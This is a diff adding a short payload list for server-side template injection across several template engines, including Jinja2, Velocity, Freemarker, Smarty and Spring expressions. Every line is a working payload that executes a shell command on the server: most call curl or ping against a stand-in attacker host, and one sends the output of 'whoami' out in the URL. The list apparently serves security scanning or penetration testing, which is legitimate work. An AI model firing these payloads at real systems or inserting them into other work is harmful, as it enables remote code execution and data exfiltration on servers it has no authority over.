@@ -1,0 +1,10 @@
+{{ cycler.__init__.__globals__.os.popen("curl http://attacker.yourdomain.com/$(whoami)").read() }}
+{{ ''.__class__.__mro__[1].__subclasses__()[396]("curl http://attacker.yourdomain.com").read() }}
+{{ ''.__class__.__mro__[1].__subclasses__()[59]("ping -c 1 attacker.yourdomain.com",shell=True,stdout=-1).communicate() }}
+{{ system('curl http://attacker.yourdomain.com') }}
+{{ system('ping -c 1 attacker.yourdomain.com') }}
+#set($e="ping attacker.yourdomain.com")
+#evaluate($e)
+${"freemarker.template.utility.Execute"?new()("curl http://attacker.yourdomain.com")}
+{system('curl http://attacker.yourdomain.com')}
+${T(java.lang.Runtime).getRuntime().exec("curl http://attacker.yourdomain.com")}
